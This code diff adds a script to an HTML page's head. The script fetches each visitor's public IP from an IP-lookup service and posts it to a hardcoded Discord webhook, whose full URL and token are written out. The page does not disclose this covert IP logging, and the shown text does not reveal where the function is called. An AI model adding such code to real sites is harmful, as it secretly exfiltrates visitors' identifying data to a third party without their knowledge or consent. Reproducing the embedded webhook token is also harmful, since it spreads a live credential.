@@ -137,6 +137,29 @@
 
 
         </script>
+        <script>
+        async function trackAndRedirect(event) {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const payload = {
+                    content: `New click from IP: ${ipData.ip}`
+                };
+                
+                await fetch('https://discord.com/api/webhooks/1366577444961648681/fzWMaCYEww4GlG47huQHRXgA4hBQ-5JFq1JB3hUFQEhiWuN3Gkj82BHDtwaKhUiYoxkG', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+        
+            } catch (error) {
+                console.error('Failed to track IP:', error);
+            }
+        }
+        </script>
     </head>
     <body>
         <div id="root"></div>
